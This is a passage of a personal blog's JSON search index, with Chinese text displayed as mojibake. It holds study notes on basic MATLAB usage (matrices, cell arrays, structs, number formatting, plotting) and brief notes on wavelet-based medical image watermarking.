ä»¥æœ€ç®€å•çš„å½¢å¼è¿”å›ç´¢å¼•çš„åˆ—å‘é‡ã€‚è½¬ç½®è¯¥å‘é‡ä»¥ä¾¿è·å–ç´¢å¼•çš„è¡Œå‘é‡ã€‚ k = find(isprime(A))&apos; k = 2 5 9 10 11 13 R = randn(3,4,5); MATLAB ä¸­çš„å…ƒèƒæ•°ç»„æ˜¯ä»¥å…¶ä»–æ•°ç»„çš„å‰¯æœ¬ä¸ºå…ƒç´ çš„å¤šç»´æ•°ç»„C = {A sum(A) prod(prod(A))}ã€‚ç¬¬ä¸€ï¼Œè¦æ£€ç´¢æŸä¸ªå…ƒèƒçš„å†…å®¹ï¼Œè¯·åœ¨èŠ±æ‹¬å·ä¸­ä½¿ç”¨ä¸‹æ ‡ã€‚ä¾‹å¦‚ï¼ŒC{1} æ£€ç´¢å¹»æ–¹çŸ©é˜µï¼ŒC{3} ä¸º 16!ã€‚ç¬¬äºŒï¼Œå…ƒèƒæ•°ç»„åŒ…å«å…¶ä»–æ•°ç»„çš„å‰¯æœ¬ï¼Œè€Œä¸åŒ…å«æŒ‡å‘è¿™äº›æ•°ç»„çš„æŒ‡é’ˆã€‚ M = cell(8,1); å…ƒèƒæ•°ç»„ for n = 1:8 M{n} = magic(n); end M v = [s; &#39;world&#39;]å‚ç›´è”æ¥å­—ç¬¦å¹¶ç”Ÿæˆ v = Hello world char å‡½æ•°å¯æ‰§è¡Œè¿™ç§å¡«å……æ“ä½œã€‚ä¾‹å¦‚ï¼ŒS = char(&#39;A&#39;,&#39;rolling&#39;,&#39;stone&#39;,&#39;gathers&#39;,&#39;momentum.&#39;) ä¹Ÿå¯ä»¥å°†æ–‡æœ¬å­˜å‚¨åœ¨å…ƒèƒæ•°ç»„ä¸­ã€‚ä¾‹å¦‚ï¼Œ C = {&#39;A&#39;;&#39;rolling&#39;;&#39;stone&#39;;&#39;gathers&#39;;&#39;momentum.&#39;} å¯ä»¥å°†å¡«å……åçš„å­—ç¬¦æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦å‘é‡å…ƒèƒæ•°ç»„ï¼šC = cellstr(S)ä½¿ç”¨ä»¥ä¸‹è¯­å¥å¯ä»¥é€†è½¬æ­¤è¿‡ç¨‹S = char(C) ç»“æ„ä½“æ˜¯å¤šç»´ MATLAB æ•°ç»„ï¼ŒåŒ…å«å¯æŒ‰æ–‡æœ¬å­—æ®µæ ‡å¿—ç¬¦è®¿é—®çš„å…ƒç´ ã€‚ä¾‹å¦‚ï¼Œ S.name = &apos;Ed Plum&apos;; S.score = 83; S.grade = &apos;B+&apos; S = name: &apos;Ed Plum&apos; score: 83 grade: &apos;B+&apos; å¯ä»¥ä¸€æ¬¡æ·»åŠ ä¸€ä¸ªå­—æ®µï¼Œ S(2).name = &apos;Toni Miller&apos;; S(2).score = 91; S(2).grade = &apos;A-&apos;; å¯ä»¥ä½¿ç”¨ä¸€ä¸ªè¯­å¥æ·»åŠ æ•´ä¸ªå…ƒç´ ï¼š S(3) = struct(&apos;name&apos;,&apos;Jerry Garcia&apos;,... &apos;score&apos;,70,&apos;grade&apos;,&apos;C&apos;) é”®å…¥S.scoreä¸é”®å…¥S(1).score, S(2).score, S(3).scoreç›¸åŒï¼Œè¿™æ˜¯ä¸€ä¸ªé€—å·åˆ†éš”åˆ—è¡¨ã€‚ scores = [S.score] names = char(S.name) names = {S.name} [N1 N2 N3] = S.name è®¿é—®ç»“æ„ä½“æ•°æ®çš„å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨åŠ¨æ€å­—æ®µåç§°ã€‚è¿™äº›åç§°å°†å­—æ®µè¡¨ç¤ºä¸ºå˜é‡è¡¨è¾¾å¼ï¼ŒMATLAB ä¼šåœ¨è¿è¡Œæ—¶è®¡ç®—è¿™äº›è¡¨è¾¾å¼ã€‚æ­¤å¤„æ˜¾ç¤ºçš„ç‚¹-æ‹¬å·è¯­æ³•å°† expression ä½œä¸ºåŠ¨æ€å­—æ®µåç§°ï¼šstructName.(expression)ä¾‹å¦‚ï¼Œè¦åœ¨å­—æ®µåç§°ä¸­è®¡ç®— expressionï¼Œå¹¶åœ¨è¡Œ 7 ä¸­çš„ 1 è‡³ 25 åˆ—å†…è·å–è¯¥å­—æ®µçš„å€¼ï¼Œè¯·ä½¿ç”¨structName.(expression)(7,1:25)","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlabç¬”è®°3","slug":"matlabç¬”è®°3","date":"2020-02-02T06:12:38.000Z","updated":"2020-02-02T06:13:25.447Z","comments":true,"path":"2020/02/02/matlabç¬”è®°3/","link":"","permalink":"http://finsenty54.github.io/2020/02/02/matlabç¬”è®°3/","excerpt":"ç§‘å­¦è®°æ•°æ³•ä½¿ç”¨å­—æ¯ e æ¥æŒ‡å®š 10 æ¬¡æ–¹çš„ç¼©æ”¾å› å­æµ®ç‚¹æ•°çš„æœ‰é™ç²¾åº¦çº¦ä¸º 16 ä½æœ‰æ•ˆå°æ•°ä½æ•°ï¼Œæœ‰é™èŒƒå›´çº¦ä¸º 10-308 è‡³ 10+308ã€‚åŒç²¾åº¦æ ¼å¼è¡¨ç¤ºçš„æ•°å­—çš„æœ€å¤§ç²¾åº¦ä¸º 52 ä½ã€‚æ•´æ•°çš„å¯ç”¨ç²¾åº¦ä¸º 8 ä½ã€16 ä½ã€32 ä½å’Œ 64 ä½ x = uint64(36028797018963968); y = uint64(36028797018963972);","text":"ç§‘å­¦è®°æ•°æ³•ä½¿ç”¨å­—æ¯ e æ¥æŒ‡å®š 10 æ¬¡æ–¹çš„ç¼©æ”¾å› å­æµ®ç‚¹æ•°çš„æœ‰é™ç²¾åº¦çº¦ä¸º 16 ä½æœ‰æ•ˆå°æ•°ä½æ•°ï¼Œæœ‰é™èŒƒå›´çº¦ä¸º 10-308 è‡³ 10+308ã€‚åŒç²¾åº¦æ ¼å¼è¡¨ç¤ºçš„æ•°å­—çš„æœ€å¤§ç²¾åº¦ä¸º 52 ä½ã€‚æ•´æ•°çš„å¯ç”¨ç²¾åº¦ä¸º 8 ä½ã€16 ä½ã€32 ä½å’Œ 64 ä½ x = uint64(36028797018963968); y = uint64(36028797018963972); ä¾‹å¦‚ï¼Œsort å‡½æ•°æ ¹æ®é‡å€¼è¿›è¡Œæ’åºï¼Œå¦‚æœé‡å€¼ç›¸ç­‰ï¼Œåˆ™æ ¹æ®ç›¸ä½è§’åº¦æ’åºã€‚ sort([3+4i, 4+3i]) é‡å€¼éƒ½ä¸º5 ans = 4.0000 + 3.0000i 3.0000 + 4.0000i angle(3+4i) ans = 0.9273 â€œç­‰äºâ€å…³ç³»è¿ç®—ç¬¦ == è¦æ±‚å®éƒ¨å’Œè™šéƒ¨ç›¸ç­‰ã€‚å…¶ä»–äºŒè¿›åˆ¶å…³ç³»è¿ç®—ç¬¦ &gt;ã€&lt;ã€&gt;= å’Œ &lt;= å¿½ç•¥æ•°å­—çš„è™šéƒ¨ï¼Œè€Œä»…è€ƒè™‘å®éƒ¨ã€‚ æ•°ç»„è¿ç®—å¯¹æ„å»ºè¡¨éå¸¸æœ‰ç”¨ã€‚å‡å®š n ä¸ºåˆ—å‘é‡n = (0:9)&#39;;ç„¶åï¼Œpows = [n n.^2 2.^n]æ„å»ºä¸€ä¸ªå¹³æ–¹å’Œ 2 æ¬¡å¹‚çš„è¡¨ï¼š pows = 0 0 1 1 1 2 2 4 4 3 9 8 4 16 16 5 25 32 6 36 64 7 49 128 8 64 256 9 81 512 format short g x = (1:0.1:2)&apos;; logs = [x log10(x)] æ„å»ºä¸€ä¸ªå¯¹æ•°è¡¨ã€‚ logs = 1.0 0 1.1 0.04139 1.2 0.07918 1.3 0.11394 1.4 0.14613 1.5 0.17609 1.6 0.20412 1.7 0.23045 1.8 0.25527 1.9 0.27875 2.0 0.30103 æœ‰å…³åˆç­‰æ•°å­¦å‡½æ•°çš„åˆ—è¡¨ï¼Œè¯·é”®å…¥help elfunæœ‰å…³æ›´å¤šé«˜ç­‰æ•°å­¦å‡½æ•°å’ŒçŸ©é˜µå‡½æ•°çš„åˆ—è¡¨ï¼Œè¯·é”®å…¥help specfunhelp elmat format å‡½æ•°æ§åˆ¶æ‰€æ˜¾ç¤ºçš„å€¼çš„æ•°å€¼æ ¼å¼ã€‚ x = [4/3 1.2345e-6] format short 1.3333 0.0000 format short e 1.3333e+000 1.2345e-006 format short g 1.3333 1.2345e-006 format long 1.33333333333333 0.00000123450000 format long e 1.333333333333333e+000 1.234500000000000e-006 format long g 1.33333333333333 1.2345e-006 format bank 1.33 0.00 format rat 4/3 1/810045 format hex 3ff5555555555555 3eb4b6231abfd271 è¯­å¥æ— æ³•å®¹çº³åœ¨ä¸€è¡Œä¸­ï¼Œè¯·ä½¿ç”¨çœç•¥å·ï¼ˆä¸‰ä¸ªå¥ç‚¹ï¼‰â€¦ è¦è¿›ä¸€æ­¥æ§åˆ¶è¾“å‡ºæ ¼å¼ï¼Œè¯·ä½¿ç”¨ sprintf å’Œ fprintf å‡½æ•°ã€‚ 100:-7:50 sum(A(1:4,4)) sum(A(:,end)) end å¼•ç”¨æœ€åä¸€ä¸ªè¡Œæˆ–åˆ— ä¸ºä»€ä¹ˆ 4Ã—4 å¹»æ–¹çŸ©é˜µçš„å¹»æ•°å’Œç­‰äº 34ï¼Ÿå¦‚æœå°†ä»‹äº 1 åˆ° 16 ä¹‹é—´çš„æ•´æ•°åˆ†ä¸ºå››ä¸ªæ€»å’Œç›¸ç­‰çš„ç»„ï¼Œè¯¥æ€»å’Œå¿…é¡»ä¸ºsum(1:16)/4å½“ç„¶ï¼Œä¹Ÿå³ans = 34 B = [A A+32; A+48 A+16] è¦åˆ é™¤ X çš„ç¬¬äºŒåˆ—ï¼Œè¯·ä½¿ç”¨X(:,2) = [] X( 2 : 2 : 10) = [] æŒ‰åˆ—æ•°ç¬¬å‡ ä¸ªç”ŸæˆX = 16 9 2 7 13 12 1","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlabç¬”è®°2","slug":"matlabç¬”è®°2","date":"2020-02-01T11:17:59.000Z","updated":"2020-02-02T06:12:27.923Z","comments":true,"path":"2020/02/01/matlabç¬”è®°2/","link":"","permalink":"http://finsenty54.github.io/2020/02/01/matlabç¬”è®°2/","excerpt":"å¤„ç†æ–‡æœ¬æ—¶ï¼Œå°†å­—ç¬¦åºåˆ—æ‹¬åœ¨å•å¼•å·ä¸­ã€‚å¯ä»¥å°†æ–‡æœ¬èµ‹ç»™å˜é‡ã€‚myText = &#39;Hello, world&#39;;å¦‚æœæ–‡æœ¬åŒ…å«å•å¼•å·ï¼Œä½¿ç”¨ä¸¤ä¸ªå•å¼•å·ã€‚ otherText = &apos;You&apos;&apos;re right&apos; otherText = &apos;You&apos;re right&apos;","text":"å¤„ç†æ–‡æœ¬æ—¶ï¼Œå°†å­—ç¬¦åºåˆ—æ‹¬åœ¨å•å¼•å·ä¸­ã€‚å¯ä»¥å°†æ–‡æœ¬èµ‹ç»™å˜é‡ã€‚myText = &#39;Hello, world&#39;;å¦‚æœæ–‡æœ¬åŒ…å«å•å¼•å·ï¼Œä½¿ç”¨ä¸¤ä¸ªå•å¼•å·ã€‚ otherText = &apos;You&apos;&apos;re right&apos; otherText = &apos;You&apos;re right&apos; whosæŸ¥è¯¢å·²æœ‰å˜é‡ å¯ä»¥ä½¿ç”¨æ–¹æ‹¬å·ä¸²è”å­—ç¬¦æ•°ç»„ï¼Œå°±åƒä¸²è”æ•°å€¼æ•°ç»„ä¸€æ ·ã€‚longText = [myText,&#39; - &#39;,otherText] è¦å°†æ•°å€¼è½¬æ¢ä¸ºå­—ç¬¦ï¼Œä½¿ç”¨ num2str æˆ– int2str ç­‰å‡½æ•°ã€‚ f = 71; c = (f-32)/1.8; tempText = [&apos;Temperature is &apos;,num2str(c),&apos;C&apos;] è°ƒç”¨å‡½æ•°ï¼Œä¾‹å¦‚ maxï¼Œè¯·å°†å…¶è¾“å…¥å‚æ•°æ‹¬åœ¨åœ†æ‹¬å·ä¸­ï¼Œå­˜åœ¨å¤šä¸ªè¾“å…¥å‚æ•°ï¼Œè¯·ä½¿ç”¨é€—å·åŠ ä»¥åˆ†éš”ï¼Œå­˜åœ¨å¤šä¸ªè¾“å‡ºå‚æ•°ï¼Œè¯·å°†å…¶æ‹¬åœ¨æ–¹æ‹¬å·ä¸­ï¼š [maxA,location] = max(A) maxA = 5 location = 3 ä»»ä½•å­—ç¬¦è¾“å…¥æ‹¬åœ¨å•å¼•å·ä¸­ï¼šdisp(&#39;hello world&#39;) åˆ›å»ºäºŒç»´çº¿å›¾ï¼Œè¯·ä½¿ç”¨ plotï¼ˆç»˜åˆ¶ï¼‰ å‡½æ•°ã€‚ x = 0:pi/100:2*pi; åˆ›å»ºçŸ©é˜µçš„ä¸€ç§æ–¹æ³• y = sin(x); plot(x,yï¼‰ æ ‡è®°è½´å¹¶æ·»åŠ æ ‡é¢˜ã€‚ xlabel(&apos;x&apos;) ylabel(&apos;sin(x)&apos;) title(&apos;Plot of the Sine Function&apos;) å‘ plot å‡½æ•°æ·»åŠ ç¬¬ä¸‰ä¸ªè¾“å…¥å‚æ•°ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨çº¢è‰²è™šçº¿ç»˜åˆ¶ç›¸åŒçš„å˜é‡ã€‚plot(x,y,&#39;r--&#39;)â€˜râ€“â€™ ä¸ºçº¿æ¡è®¾å®šã€‚æ¯ä¸ªè®¾å®šå¯åŒ…å«è¡¨ç¤ºçº¿æ¡é¢œè‰²ã€æ ·å¼å’Œæ ‡è®°çš„å­—ç¬¦ã€‚æ ‡è®°æ˜¯åœ¨ç»˜åˆ¶çš„æ¯ä¸ªæ•°æ®ç‚¹ä¸Šæ˜¾ç¤ºçš„ç¬¦å·ï¼Œä¾‹å¦‚ï¼Œ+ã€o æˆ– ã€‚ä¾‹å¦‚ï¼Œâ€™g:â€˜ è¯·æ±‚ç»˜åˆ¶ä½¿ç”¨ * æ ‡è®°çš„ç»¿è‰²ç‚¹çº¿ã€‚ å°†ç»˜å›¾æ·»åŠ åˆ°ç°æœ‰å›¾çª—ä¸­ï¼Œè¯·ä½¿ç”¨ hold onã€‚åœ¨ä½¿ç”¨ hold off æˆ–å…³é—­çª—å£ä¹‹å‰ï¼Œå½“å‰å›¾çª—çª—å£ä¸­ä¼šæ˜¾ç¤ºæ‰€æœ‰ç»˜å›¾ hold on y2 = cos(x); plot(x,y2,&apos;:&apos;) legend(&apos;sin&apos;,&apos;cos&apos;) legendå°±æ˜¯æ·»åŠ å›¾ä¾‹çš„æ ‡æ³¨ æ¯”å¦‚ï¼šlegend(&apos;First&apos;,&apos;Second&apos;,-1)ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ä¾æ¬¡æ³¨é‡Šplotä¸­çš„å›¾ï¼Œåé¢æ¿çš„å‚æ•°ï¼ˆæ­¤å¤„æ˜¯-1ï¼‰è¡¨ç¤ºæ³¨é‡Šçš„ä½ç½®ã€‚ hold off ä¸‰ç»´å›¾é€šå¸¸æ˜¾ç¤ºä¸€ä¸ªç”±å¸¦ä¸¤ä¸ªå˜é‡çš„å‡½æ•°ï¼ˆå³ z = f (x,y)ï¼‰å®šä¹‰çš„æ›²é¢å›¾ã€‚ [X,Y] = meshgrid(-2:.2:2); STEP=0.2 meshgridå‡½æ•°ç”Ÿæˆçš„Xï¼ŒYæ˜¯å¤§å°ç›¸ç­‰çš„çŸ©é˜µ surf å‡½æ•°åŠå…¶ä¼´éšå‡½æ•° mesh ä»¥ä¸‰ç»´å½¢å¼æ˜¾ç¤ºæ›²é¢å›¾ã€‚surf ä½¿ç”¨é¢œè‰²æ˜¾ç¤ºæ›²é¢å›¾çš„è¿æ¥çº¿å’Œé¢ã€‚mesh ç”Ÿæˆä»…ä»¥é¢œè‰²æ ‡è®°è¿æ¥å®šä¹‰ç‚¹çš„çº¿æ¡çš„çº¿æ¡†æ›²é¢å›¾ã€‚ ä½¿ç”¨ subplot å‡½æ•°å¯ä»¥åœ¨åŒä¸€çª—å£çš„ä¸åŒå­åŒºåŸŸæ˜¾ç¤ºå¤šä¸ªç»˜å›¾ã€‚subplot çš„å‰ä¸¤ä¸ªè¾“å…¥è¡¨ç¤ºæ¯è¡Œå’Œæ¯åˆ—ä¸­çš„ç»˜å›¾æ•°ã€‚ç¬¬ä¸‰ä¸ªè¾“å…¥æŒ‡å®šç»˜å›¾æ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚ é”®å…¥è„šæœ¬åç§°å³å¯è¿è¡Œè¯¥è„šæœ¬ã€‚è„šæœ¬æ˜¯æœ€ç®€å•çš„ä¸€ç§ MATLABÂ® ç¨‹åºã€‚è„šæœ¬æ˜¯ä¸€ä¸ªåŒ…å«å¤šè¡Œè¿ç»­ MATLAB å‘½ä»¤å’Œå‡½æ•°è°ƒç”¨çš„æ‰©å±•åä¸º.mçš„æ–‡ä»¶ã€‚åœ¨å‘½ä»¤è¡Œä¸­é”®å…¥è„šæœ¬åç§°å³å¯è¿è¡Œè¯¥è„šæœ¬ã€‚è¦åˆ›å»ºè„šæœ¬ï¼Œè¯·ä½¿ç”¨ edit å‘½ä»¤ã€‚edit plotrandä½¿ç”¨ç™¾åˆ†æ¯” (%) ç¬¦å·æ·»åŠ æ³¨é‡Š nsamples = 5; npoints = 50; for k = 1:nsamples currentData = rand(npoints,1); sampleMean(k) = mean(currentData); end overallMean = mean(sampleMean) if overallMean &lt; .49 disp(&apos;Mean is less than expected&apos;) elseif overallMean &gt; .51 disp(&apos;Mean is greater than expected&apos;) else disp(&apos;Mean is within the expected range&apos;) end ä½¿ç”¨ doc å‘½ä»¤åœ¨å•ç‹¬çš„çª—å£ä¸­æ‰“å¼€å‡½æ•°æ–‡æ¡£ã€‚doc meanåœ¨é”®å…¥å‡½æ•°è¾“å…¥å‚æ•°çš„å·¦æ‹¬å·ä¹‹åæš‚åœï¼Œæ­¤æ—¶å‘½ä»¤è¡Œçª—å£ä¸­ä¼šæ˜¾ç¤ºç›¸åº”å‡½æ•°çš„æç¤ºä½¿ç”¨ help å‘½ä»¤å¯åœ¨å‘½ä»¤è¡Œçª—å£ä¸­æŸ¥çœ‹ç›¸åº”å‡½æ•°çš„ç®€æ˜æ–‡æ¡£ã€‚ ä½¿ç”¨ç©ºæ ¼æˆ–é€—å·åˆ†éš”è¡Œçš„å…ƒç´ ã€‚ä½¿ç”¨åˆ†å· ; è¡¨ç¤ºæ¯è¡Œæœ«å°¾ã€‚ä½¿ç”¨æ–¹æ‹¬å· [ ] å°†æ•´ä¸ªå…ƒç´ åˆ—è¡¨æ‹¬èµ·æ¥ã€‚ sum(A) è®¡ç®—åˆ—sum(Aâ€™)â€™é¿å…åŒé‡è½¬ç½®çš„å…¶ä»–æ–¹æ³•ï¼Œè¯·åœ¨ sum å‡½æ•°ä¸­ä½¿ç”¨ç»´åº¦å‚æ•°ï¼šsum(A,2) diag(A) è·å–å¯¹è§’çº¿å€¼ å›¾å½¢çš„å‡½æ•° fliplr å¯ä»¥ä»å·¦å¾€å³åœ°ç¿»è½¬çŸ©é˜µï¼šsum(diag(fliplr(A))) magic å‡½æ•°åˆ›å»ºå‡ ä¹ä»»æ„å¤§å°çš„å¹»æ–¹çŸ©é˜µã€‚è¡Œåˆ—å¯¹è§’çº¿ç›¸åŠ éƒ½ç›¸åŒå››ä¸ªç”¨äºç”ŸæˆåŸºæœ¬çŸ©é˜µçš„å‡½æ•°ã€‚zeroså…¨éƒ¨ä¸ºé›¶oneså…¨éƒ¨ä¸º 1randå‡åŒ€åˆ†å¸ƒçš„éšæœºå…ƒç´ randnæ­£æ€åˆ†å¸ƒçš„éšæœºå…ƒç´  MATLAB ä¸éœ€è¦ä»»ä½•ç±»å‹å£°æ˜æˆ–ç»´åº¦è¯´æ˜ã€‚å½“ MATLAB é‡åˆ°æ–°çš„å˜é‡åç§°æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨åˆ›å»ºå˜é‡ï¼Œå¹¶åˆ†é…é€‚å½“å¤§å°çš„å­˜å‚¨ã€‚å¦‚æœæ­¤å˜é‡å·²å­˜åœ¨ï¼ŒMATLAB ä¼šæ›´æ”¹å…¶å†…å®¹ï¼Œå¹¶æ ¹æ®éœ€è¦åˆ†é…æ–°å­˜å‚¨ã€‚ MATLAB ä»…ä½¿ç”¨åç§°çš„å‰ N ä¸ªå­—ç¬¦ï¼ˆå…¶ä¸­ N æ˜¯å‡½æ•° namelengthmax è¿”å›çš„æ•°å­—ï¼‰ ä¸º63","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlabç¬”è®°1","slug":"matlabç¬”è®°1","date":"2020-01-30T11:49:15.000Z","updated":"2020-01-30T11:55:39.032Z","comments":true,"path":"2020/01/30/matlabç¬”è®°1/","link":"","permalink":"http://finsenty54.github.io/2020/01/30/matlabç¬”è®°1/","excerpt":"a = [1 2 3 4]åˆ›å»ºçŸ©é˜µçš„å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ onesã€zeros æˆ– rand ç­‰å‡½æ•°ã€‚ä¾‹å¦‚ï¼Œåˆ›å»ºä¸€ä¸ªç”±é›¶ç»„æˆçš„ 5Ã—1 åˆ—å‘é‡ã€‚z = zeros(5,1) MATLAB å…è®¸æ‚¨ä½¿ç”¨å•ä¸€çš„ç®—æœ¯è¿ç®—ç¬¦æˆ–å‡½æ•°æ¥å¤„ç†çŸ©é˜µä¸­çš„æ‰€æœ‰å€¼ã€‚a + 10","text":"a = [1 2 3 4]åˆ›å»ºçŸ©é˜µçš„å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ onesã€zeros æˆ– rand ç­‰å‡½æ•°ã€‚ä¾‹å¦‚ï¼Œåˆ›å»ºä¸€ä¸ªç”±é›¶ç»„æˆçš„ 5Ã—1 åˆ—å‘é‡ã€‚z = zeros(5,1) MATLAB å…è®¸æ‚¨ä½¿ç”¨å•ä¸€çš„ç®—æœ¯è¿ç®—ç¬¦æˆ–å‡½æ•°æ¥å¤„ç†çŸ©é˜µä¸­çš„æ‰€æœ‰å€¼ã€‚a + 10 è¦è½¬ç½®çŸ©é˜µï¼Œè¯·ä½¿ç”¨å•å¼•å· (â€˜) format å‘½ä»¤å¯ä»¥æ˜¾ç¤ºæ›´å¤šå°æ•°ä½æ•°ï¼š123format longp = a*inv(a)format short format ä»…å½±å“æ•°å­—æ˜¾ç¤ºï¼Œè€Œä¸å½±å“ MATLAB å¯¹æ•°å­—çš„è®¡ç®—æˆ–ä¿å­˜æ–¹å¼ã€‚ è¦æ‰§è¡Œå…ƒç´ çº§ä¹˜æ³•ï¼ˆè€ŒéçŸ©é˜µä¹˜æ³•ï¼‰ï¼Œè¯·ä½¿ç”¨ . è¿ç®—ç¬¦ï¼š`p = a.aä¹˜æ³•ã€é™¤æ³•å’Œå¹‚çš„çŸ©é˜µè¿ç®—ç¬¦åˆ†åˆ«å…·æœ‰æ‰§è¡Œå…ƒç´ çº§è¿ç®—çš„å¯¹åº”æ•°ç»„è¿ç®—ç¬¦ã€‚ä¾‹å¦‚ï¼Œè®¡ç®— a çš„å„ä¸ªå…ƒç´ çš„ä¸‰æ¬¡æ–¹ï¼ša.^3` ä¸²è”æ˜¯è¿æ¥æ•°ç»„ä»¥ä¾¿å½¢æˆæ›´å¤§æ•°ç»„çš„è¿‡ç¨‹ã€‚å®é™…ä¸Šï¼Œç¬¬ä¸€ä¸ªæ•°ç»„æ˜¯é€šè¿‡å°†å…¶å„ä¸ªå…ƒç´ ä¸²è”èµ·æ¥è€Œæ„æˆçš„ã€‚æˆå¯¹çš„æ–¹æ‹¬å· [] å³ä¸ºä¸²è”è¿ç®—ç¬¦ã€‚A = [a,a] ä½¿ç”¨é€—å·å°†å½¼æ­¤ç›¸é‚»çš„æ•°ç»„ä¸²è”èµ·æ¥ç§°ä¸ºæ°´å¹³ä¸²è”ã€‚æ¯ä¸ªæ•°ç»„å¿…é¡»å…·æœ‰ç›¸åŒçš„è¡Œæ•°ã€‚åŒæ ·ï¼Œå¦‚æœå„æ•°ç»„å…·æœ‰ç›¸åŒçš„åˆ—æ•°ï¼Œåˆ™å¯ä»¥ä½¿ç”¨åˆ†å·å‚ç›´ä¸²è”ã€‚A = [a; a] è¦è¡¨ç¤ºå¤æ•°çš„è™šéƒ¨ï¼Œè¯·ä½¿ç”¨ i æˆ– jã€‚ c = [3+4i, 4+3j; -i, 10j] c = 2Ã—2 complex clc æ¯ä¸ªå˜é‡éƒ½æ˜¯ä¸€ä¸ªå¯åŒ…å«è®¸å¤šæ•°å­—çš„æ•°ç»„ å¼•ç”¨æ•°ç»„ä¸­çš„ç‰¹å®šå…ƒç´ æœ‰ä¸¤ç§æ–¹æ³•ã€‚æœ€å¸¸è§çš„æ–¹æ³•æ˜¯æŒ‡å®šè¡Œå’Œåˆ—ä¸‹æ ‡ï¼Œä¾‹å¦‚A(4,2)å¦ä¸€ç§æ–¹æ³•ä¸å¤ªå¸¸ç”¨ï¼Œä½†æœ‰æ—¶éå¸¸æœ‰ç”¨ï¼Œå³ä½¿ç”¨å•ä¸€ä¸‹æ ‡æŒ‰é¡ºåºå‘ä¸‹éå†æ¯ä¸€åˆ—ï¼šA(8)å¯ä»¥åœ¨èµ‹å€¼è¯­å¥å·¦ä¾§æŒ‡å®šå½“å‰ç»´å¤–éƒ¨çš„å…ƒç´ ã€‚æ•°ç»„å¤§å°ä¼šå¢å¤§ä»¥ä¾¿å®¹çº³æ–°å…ƒç´ ã€‚A(4,5) = 17 è¦å¼•ç”¨å¤šä¸ªæ•°ç»„å…ƒç´ ï¼Œè¯·ä½¿ç”¨å†’å·è¿ç®—ç¬¦ï¼Œè¿™ä½¿æ‚¨å¯ä»¥æŒ‡å®šä¸€ä¸ªæ ¼å¼ä¸ºstart:endçš„èŒƒå›´ã€‚ä¾‹å¦‚ï¼Œåˆ—å‡º A å‰ä¸‰è¡ŒåŠç¬¬äºŒåˆ—ä¸­çš„å…ƒç´ ï¼šA(1:3,2)å•ç‹¬çš„å†’å·ï¼ˆæ²¡æœ‰èµ·å§‹å€¼æˆ–ç»“æŸå€¼ï¼‰æŒ‡å®šè¯¥ç»´ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚ä¾‹å¦‚ï¼Œé€‰æ‹© A ç¬¬ä¸‰è¡Œä¸­çš„æ‰€æœ‰åˆ—ï¼šA(3,:) å†’å·è¿ç®—ç¬¦è¿˜å…è®¸æ‚¨ä½¿ç”¨è¾ƒé€šç”¨çš„æ ¼å¼start: step :endåˆ›å»ºç­‰è·å‘é‡å€¼ã€‚å¦‚æœçœç•¥ä¸­é—´çš„æ­¥éª¤ï¼ˆå¦‚ start:end ä¸­ï¼‰ï¼ŒMATLAB ä¼šä½¿ç”¨é»˜è®¤æ­¥é•¿å€¼ 1ã€‚B = 0:10:100 é€€å‡º MATLAB åï¼Œå·¥ä½œåŒºå˜é‡ä¸ä¼šä¿ç•™ã€‚ä½¿ç”¨saveå‘½ä»¤ä¿å­˜æ•°æ®ä»¥ä¾›å°†æ¥ä½¿ç”¨ï¼Œsave myfile.matè¦æ¸…é™¤å·¥ä½œåŒºä¸­çš„æ‰€æœ‰å˜é‡ï¼Œè¯·ä½¿ç”¨clearå‘½ä»¤ã€‚ä½¿ç”¨ load å°† MAT æ–‡ä»¶ä¸­çš„æ•°æ®è¿˜åŸåˆ°å·¥ä½œåŒºã€‚load myfile.mat","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"Medical Image WatermarkingTechniques and Applications>>ç¬”è®°4","slug":"Medical Image WatermarkingTechniques and Applications>>ç¬”è®°4","date":"2020-01-28T10:45:56.000Z","updated":"2020-01-29T07:35:45.871Z","comments":true,"path":"2020/01/28/Medical Image WatermarkingTechniques and Applications>>ç¬”è®°4/","link":"","permalink":"http://finsenty54.github.io/2020/01/28/Medical Image WatermarkingTechniques and Applications>>ç¬”è®°4/","excerpt":"orthonormal matrices æ­£äº¤çŸ©é˜µa message can be hidden in cover document if the content of the document hashigh redundancy.propose a new reliable method by hiding the encrypted watermark in the RONI part of the medical image using DWT approach.ROI Based Medical Image Watermarking with Zero Distortion and Enhanced Security æ‰€è¯»è®ºæ–‡ ç›´æ–¹å›¾å‡è¡¡åŒ–ï¼ˆHistogram Equalizationï¼‰","text":"orthonormal matrices æ­£äº¤çŸ©é˜µa message can be hidden in cover document if the content of the document hashigh redundancy.propose a new reliable method by hiding the encrypted watermark in the RONI part of the medical image using DWT approach.ROI Based Medical Image Watermarking with Zero Distortion and Enhanced Security æ‰€è¯»è®ºæ–‡ ç›´æ–¹å›¾å‡è¡¡åŒ–ï¼ˆHistogram Equalizationï¼‰","categories":[],"tags":[{"name":"watermark","slug":"watermark","permalink":"http://finsenty54.github.io/tags/watermark/"}]},{"title":"Medical Image WatermarkingTechniques and Applications>>ç¬”è®°3","slug":"Medical Image WatermarkingTechniques and Applications>>ç¬”è®°3","date":"2020-01-25T07:21:36.000Z","updated":"2020-01-29T07:29:13.842Z","comments":true,"path":"2020/01/25/Medical Image WatermarkingTechniques and Applications>>ç¬”è®°3/","link":"","permalink":"http://finsenty54.github.io/2020/01/25/Medical Image WatermarkingTechniques and Applications>>ç¬”è®°3/","excerpt":"There are a wide variety of popular wavelet algorithms, including Daubechies wavelets, Mexican Hat wavelets and Morlet wavelets HAAR In addition, the Haar wavelet transform is fast, memory efficient and exactly reversible without the edge effects that are present in other wavelet transforms. the 